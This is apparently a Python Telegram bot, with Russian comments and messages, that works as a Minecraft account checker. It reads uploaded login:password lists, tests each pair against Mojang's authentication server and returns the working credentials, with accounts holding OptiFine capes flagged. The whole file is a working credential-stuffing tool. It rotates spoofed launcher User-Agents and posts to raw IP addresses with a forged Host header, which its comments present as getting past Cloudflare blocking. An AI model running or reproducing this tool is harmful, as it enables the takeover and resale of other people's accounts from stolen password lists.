import os
import logging
import asyncio
import aiofiles
import requests
import time
import random
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'capes': 0,
    'migrated': 0,
    'start_time': datetime.now()
}

# Пулы для обхода блокировок
USER_AGENTS = [
    'Minecraft Launcher/2.2.1234',
    'Minecraft Launcher/2.1.1234',
    'Minecraft Launcher/2.3.1234',
    'Minecraft/1.19.2',
    'Minecraft/1.20.1',
    'Minecraft/1.21',
    'Java/17',
    'Java/21'
]

class AccountChecker:
    """Проверка аккаунтов"""
    
    @staticmethod
    async def check_account(login, password):
        """Проверяет один аккаунт"""
        
        # Очищаем входные данные
        login = login.strip()
        password = password.strip()
        
        # Пробуем разные способы подключения
        for attempt in range(3):  # 3 попытки
            try:
                # Создаем сессию с рандомным User-Agent
                session = requests.Session()
                session.headers.update({
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                })
                
                # Добавляем задержку между попытками
                if attempt > 0:
                    await asyncio.sleep(2 ** attempt)  # 2, 4, 8 секунд
                
                auth_data = {
                    "agent": {
                        "name": "Minecraft",
                        "version": 1
                    },
                    "username": login,
                    "password": password,
                    "requestUser": True
                }
                
                # СПОСОБ 1: Через разные IP адреса (обходим Cloudflare)
                mojang_ips = [
                    '34.96.72.24',
                    '34.96.72.82', 
                    '34.96.72.143',
                    '34.96.72.167',
                    '34.96.72.201',
                    '34.96.72.245'
                ]
                
                for ip in mojang_ips:
                    try:
                        # Добавляем заголовок Host для правильной маршрутизации
                        direct_headers = session.headers.copy()
                        direct_headers['Host'] = 'authserver.mojang.com'
                        
                        resp = session.post(
                            f'https://{ip}/authenticate',
                            json=auth_data,
                            headers=direct_headers,
                            timeout=15,
                            verify=True
                        )
                        
                        if resp.status_code == 200:
                            logger.info(f"✅ Успех через IP {ip}")
                            data = resp.json()
                            
                            # Проверяем результат
                            if 'selectedProfile' in data:
                                username = data['selectedProfile']['name']
                                uuid = data['selectedProfile']['id']
                                
                                # Проверяем плащ
                                has_cape = await AccountChecker.check_cape(username)
                                
                                # Последний вход
                                last_seen = await AccountChecker.get_last_seen(username)
                                
                                session.close()
                                return {
                                    'login': login,
                                    'password': password,
                                    'username': username,
                                    'uuid': uuid,
                                    'status': 'valid',
                                    'has_cape': has_cape,
                                    'last_seen': last_seen
                                }
                            elif 'error' in data:
                                if 'migrated' in data.get('errorMessage', '').lower():
                                    session.close()
                                    return {
                                        'login': login,
                                        'status': 'migrated',
                                        'error': 'Microsoft'
                                    }
                                else:
                                    session.close()
                                    return {
                                        'login': login,
                                        'status': 'invalid',
                                        'error': 'Неверный пароль'
                                    }
                    except Exception as e:
                        logger.warning(f"IP {ip} не ответил: {str(e)[:30]}")
                        continue
                
                # СПОСОБ 2: Обычный запрос (если IP не сработали)
                try:
                    resp = session.post(
                        'https://authserver.mojang.com/authenticate',
                        json=auth_data,
                        timeout=15
                    )
                    
                    if resp.status_code == 200:
                        data = resp.json()
                        if 'selectedProfile' in data:
                            username = data['selectedProfile']['name']
                            uuid = data['selectedProfile']['id']
                            
                            has_cape = await AccountChecker.check_cape(username)
                            last_seen = await AccountChecker.get_last_seen(username)
                            
                            session.close()
                            return {
                                'login': login,
                                'password': password,
                                'username': username,
                                'uuid': uuid,
                                'status': 'valid',
                                'has_cape': has_cape,
                                'last_seen': last_seen
                            }
                except:
                    pass
                
                session.close()
                
            except Exception as e:
                logger.error(f"Попытка {attempt+1} не удалась: {e}")
                continue
        
        # Если все попытки провалились
        return {
            'login': login,
            'status': 'error',
            'error': 'Не могу подключиться (Cloudflare)'
        }
    
    @staticmethod
    async def check_cape(username):
        """Проверяет наличие плаща"""
        try:
            url = f"https://optifine.net/capes/{username}.png"
            resp = requests.get(url, timeout=5, stream=True)
            
            if resp.status_code == 200:
                size = int(resp.headers.get('content-length', 0))
                if size > 1000:  # Нормальный плащ > 1KB
                    logger.info(f"🔥 Плащ у {username}")
                    return True
            return False
        except:
            return False
    
    @staticmethod
    async def get_last_seen(username):
        """Получает дату последнего входа"""
        try:
            # Получаем UUID
            resp = requests.get(
                f"https://api.mojang.com/users/profiles/minecraft/{username}",
                timeout=5
            )
            if resp.status_code != 200:
                return "неизвестно"
            
            uuid = resp.json()['id']
            
            # Запрос к NameMC
            resp = requests.get(
                f"https://api.namemc.com/profile/{uuid}",
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=5
            )
            
            if resp.status_code == 200:
                data = resp.json()
                if 'lastSeen' in data:
                    last = data['lastSeen'] / 1000
                    days = (datetime.now() - datetime.fromtimestamp(last)).days
                    
                    if days == 0:
                        return "сегодня"
                    elif days == 1:
                        return "вчера"
                    else:
                        return f"{days} дн"
            return "неизвестно"
        except:
            return "неизвестно"

async def process_file(file_path, update, context):
    """Обработка файла"""
    results = {
        'valid': [],
        'capes': [],
        'invalid': [],
        'migrated': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🔄 **Начинаю проверку...**\n"
        "⏳ Это может занять время из-за Cloudflare"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0], parts[1]))
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Проверяю...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 3 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['capes'])}\n"
                    f"⏱ **Прошло:** {int(elapsed)}с\n\n"
                    f"🔄 **Проверяю:** {login[:20]}..."
                )
            
            # Проверка
            result = await AccountChecker.check_account(login, password)
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['capes'].append(result)
                    bot_stats['capes'] += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['invalid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Увеличиваем задержку между запросами
            await asyncio.sleep(1.5)  # Важно! Большая задержка чтобы не заблокировали
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с плащами
        if results['capes']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['capes'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n\n")
                for acc in results['capes']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc['username']}\n"
                        f"Последний вход: {acc.get('last_seen', 'неизвестно')}\n"
                        f"{'='*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Плащей: {len(results['capes'])}**"
                )
            os.remove(cape_file)
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего аккаунтов: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['capes'])}\n"
            f"• ❌ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 В Microsoft: {len(results['migrated'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **OptiFace Cape Checker**\n\n"
        f"🔍 **Проверяю логин:пароль**\n"
        f"с обходом Cloudflare!\n\n"
        f"📥 **Кидай .txt файл**\n"
        f"с аккаунтами\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено плащей: {bot_stats['capes']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Битых: {bot_stats['invalid']}\n"
            f"🔥 С плащами: {bot_stats['capes']}\n"
            f"🔄 Microsoft: {bot_stats['migrated']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n"
            "4️⃣ Получи результат\n\n"
            "📌 **Пример:**\n"
            "`user@gmail.com:pass123`\n\n"
            "⚠️ **Важно:**\n"
            "• Из-за Cloudflare проверка медленная\n"
            "• 100 акков ~ 5-7 минут\n"
            "• Наберись терпения!"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА!")
        return
    
    print("=" * 50)
    print("🚀 ЗАПУСК БОТА (ЛОГИН:ПАРОЛЬ + CLOUDFLARE)")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ РАБОТАЕТ! Жду файлы...")
    app.run_polling()

if __name__ == '__main__':
    main()